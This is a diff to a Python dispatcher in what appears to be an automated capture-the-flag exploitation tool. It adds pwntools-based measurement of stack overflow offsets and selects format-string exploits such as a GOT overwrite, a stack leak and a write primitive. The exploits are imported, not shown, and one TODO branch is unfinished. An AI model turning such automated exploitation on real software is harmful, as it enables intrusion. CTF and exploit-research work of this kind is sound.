@@ -3,13 +3,34 @@ Determines which exploits to call
 """
 
 import re
-from pwn import ELF, process
+import os
+from pwn import ELF, process, ROP, cyclic, cyclic_find
 from typing import List, Union
 
 from vulnerabilities import FormatString, StackOverflow, get_format_string_vulns, get_stack_overflow_vulns
-from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite, stack_leak, write_prim, got_overwrite
+# Imports exploits for StackOverflows
+from exploits import ret2win, ret2system, ret2execve, ret2syscall, ret2libc, ropwrite
+# Imports exploits for FormatStrings
+from exploits import stack_leak, libc_leak, write_prim, got_overwrite
 
 pointer_re = r"""0x[0-9a-f]*"""
+
+
+def get_overflow_size(binary, register='rsp', size_of_input=5000) -> int:
+    """
+    Returns -1 if nothing is found in the core file for the given register.
+    Modify size_of_input to try larger/smaller buffer.
+    Register defaults to rsp but function can be used for any.
+    """
+    p = process(binary)
+    p.sendline(cyclic(size_of_input, n=8))
+    p.wait()
+    # Unsure why solarpanth3r.py uses a try for the corefile.
+    # A corefile is made as soon as process is called with a valid binary.
+    core = p.corefile
+    offset = cyclic_find(core.read(core.registers[register], 8), n=8)
+    os.remove(core.file.name)
+    return offset
 
 
 def end_prog(flag: str) -> None:
@@ -22,6 +43,12 @@ def dispatch_exploits(file_path: str) -> None:
     Calls exploits based on possible ones
     """
     syms = ELF(file_path).symbols.keys()
+    
+    # Since the offset will return -1 if nothing is found,
+    # these offsets can be used in conditional checks.
+    rsp_offset = get_overflow_size(file_path)
+    rbp_offset = get_overflow_size(file_path, 'rbp')
+    rip_offset = get_overflow_size(file_path, 'rip')
 
     # Get all vulnerabilites
     vulns: List[Union[FormatString, StackOverflow]] = get_format_string_vulns(file_path) + get_stack_overflow_vulns(file_path)
@@ -65,6 +92,33 @@ def dispatch_exploits(file_path: str) -> None:
                 flag = ropwrite(vuln)
                 if flag is not None:
                     end_prog(flag)
+                    
+        elif isinstance(vuln, FormatString):
+            # GOT Overwrite
+            if 'win' in syms:
+                flag = got_overwrite(vuln)
+                if flag is not None:
+                    end_prog(flag)
+
+            # Stack Leak
+            elif 'fopen' in syms:
+                flag = stack_leak(vuln)
+                if flag is not None:
+                    end_prog(flag)
+            
+            # Write Primitive
+            elif 'pwnme' in syms:
+                flag = write_prim(vuln)
+                if flag is not None:
+                    end_prog(flag)
+
+            # TODO
+            elif c.vuln_printfs in syms and True:
+                flag = None
+                libc = ELF(c.libc_path)
+                r = ROP(libc)
+            else:
+                pass
 
         else:
             flag = write_prim(vuln)
